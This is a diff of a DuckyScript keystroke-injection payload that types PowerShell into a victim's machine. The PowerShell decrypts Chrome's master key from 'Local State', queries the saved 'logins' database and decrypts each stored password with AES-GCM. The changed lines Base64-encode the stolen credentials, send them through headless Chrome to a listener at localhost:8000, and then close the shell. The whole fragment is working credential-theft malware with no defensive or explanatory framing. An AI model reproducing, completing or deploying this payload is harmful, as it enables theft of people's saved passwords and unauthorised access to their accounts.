@@ -40,7 +40,7 @@ STRING $l=@()
 ENTER
 STRING if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
 ENTER
-STRING $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([System.Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
+STRING $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
 ENTER
 STRING for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
 ENTER
@@ -52,6 +52,13 @@ STRING $e=[byte[]]::new($k-31)
 ENTER
 STRING $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
 ENTER
-STRING $l
+STRING $r=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(($l)-join','))
 ENTER
+STRING start-process "chrome" "--headless http://localhost:8000/?$r"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 250
+STRING exit
 ENTER
